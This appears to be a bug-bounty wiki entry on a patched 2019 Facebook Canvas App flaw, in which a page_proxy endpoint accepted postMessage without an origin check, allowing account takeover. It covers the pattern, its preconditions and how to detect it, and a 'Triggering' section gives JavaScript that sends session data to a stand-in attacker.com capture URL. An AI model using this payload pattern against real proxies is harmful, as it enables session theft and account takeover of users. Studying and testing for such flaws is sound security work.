---
title: postMessage ATO — Facebook Canvas App Proxy Endpoint
slug: postmessage-ato-facebook
created_utc: 2026-05-21T00:00:00Z
updated_utc: 2026-05-21T00:00:00Z
tags: [technique/postmessage, technique/ato, technique/facebook, technique/csrf]
inbound: []
---

# postMessage ATO — Facebook Canvas App Proxy Endpoint

## Pattern

Facebook Canvas Apps allow embedding external websites inside Facebook via
iframes. To pass messages from the iframe to Facebook, a `page_proxy` endpoint
received a `postMessage`, constructed an HTTP form from the message data, and
forwarded it to the embedded app's URL via a POST request.

Vulnerability: the `page_proxy` endpoint did not validate the origin of
incoming `postMessage` events. An attacker-controlled page could send a
`postMessage` to the proxy endpoint with a crafted URL and data, causing
Facebook's servers to forward an HTTP POST to an attacker-specified URL with
the victim's session cookies attached.

Youssef Sammouda's $25k exploit:
1. Attacker page opens a window to `https://www.facebook.com/page_proxy`.
2. Attacker sends a `postMessage` to that window with `url = attacker.com`.
3. Facebook's proxy posts the victim's Facebook session data (including CSRF
   token and session cookies) to `attacker.com`.
4. Attacker uses the captured credentials to take over the account.

## Preconditions

- Facebook Canvas App `page_proxy` endpoint (or similar proxy) accepts
  `postMessage` without origin check.
- The proxy forwards requests using the victim's session context.
- Cross-origin window reference to the proxy page is obtainable.

## Detection

This was a specific Facebook bug now patched. The general pattern to test:
- Identify proxy endpoints that relay `postMessage` data as HTTP requests.
- Test if origin checking is enforced: send `postMessage` from cross-origin
  context and observe if request is forwarded.
- Check for any "exchange postMessage to HTTP" patterns in web apps with
  iframe-based widget/app integrations.

## Triggering

```javascript
// Open the proxy endpoint in a new window
const proxyWindow = window.open('https://www.facebook.com/page_proxy');

// After load, send malicious postMessage
setTimeout(() => {
  proxyWindow.postMessage({
    url: 'https://attacker.com/capture',
    method: 'POST',
    data: 'anything=here'
  }, '*');
}, 2000);
// Facebook proxy forwards a POST to attacker.com with victim's auth context
```

## Seen in the wild

- 2019 — Facebook, $25,000. Youssef Sammouda. Exploited the Canvas App
  `page_proxy` endpoint that lacked origin validation on incoming `postMessage`
  events. Full account takeover via session data leakage to attacker server.
  [BBRE](https://www.youtube.com/watch?v=jPMaZt9ZJes)

## References

- Youssef Sammouda's blog post
- See also: [../postmessage/_index.md](../postmessage/_index.md)
- See also: [oauth-csrf-captcha-ato-chain](oauth-csrf-captcha-ato-chain.md)
  — the $45k Facebook chain
